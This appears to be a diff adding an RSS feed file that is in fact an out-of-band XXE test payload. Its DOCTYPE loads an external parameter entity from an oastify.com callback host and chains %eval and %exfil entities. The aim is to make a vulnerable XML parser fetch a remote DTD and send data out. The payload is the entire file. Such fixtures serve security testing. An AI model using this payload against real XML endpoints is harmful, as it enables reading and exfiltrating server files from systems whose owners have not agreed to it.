@@ -1,0 +1,14 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE rss [
+  <!ENTITY % dtd SYSTEM "http://fxgjr5bii2n3wltp3ionb8uyup0go6cv.oastify.com">
+  %dtd;
+  %eval;
+  %exfil;
+]>
+<rss version="2.0">
+  <channel>
+    <title>OOB XXE test</title>
+    <link>https://example.com</link>
+    <description>Parameter entity OOB exfil</description>
+  </channel>
+</rss>
